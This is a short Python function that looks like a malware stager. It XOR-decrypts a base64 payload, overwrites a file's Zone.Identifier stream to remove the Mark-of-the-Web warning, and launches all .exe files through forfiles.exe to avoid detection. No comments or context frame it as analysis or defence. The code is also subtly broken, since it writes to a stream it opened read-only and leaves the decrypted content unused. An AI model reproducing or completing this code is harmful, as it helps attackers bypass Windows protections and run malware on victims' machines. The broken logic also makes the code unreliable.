import subprocess
import zipfile
import base64

def stage(path, encoded, key):
    decoded = base64.b64decode(encoded)
    content = bytes([byte ^ key[i % len(key)] for i, byte in enumerate(decoded)])
    archive = zipfile.ZipFile(path)
    with open(path + ':Zone.Identifier', 'r') as zone:
        zone.write('[ZoneTransfer]\r\nZoneId=0\r\n')
    subprocess.Popen(['forfiles.exe', '/p', path, '/m', '*.exe', '/c', 'cmd /c call @path'])
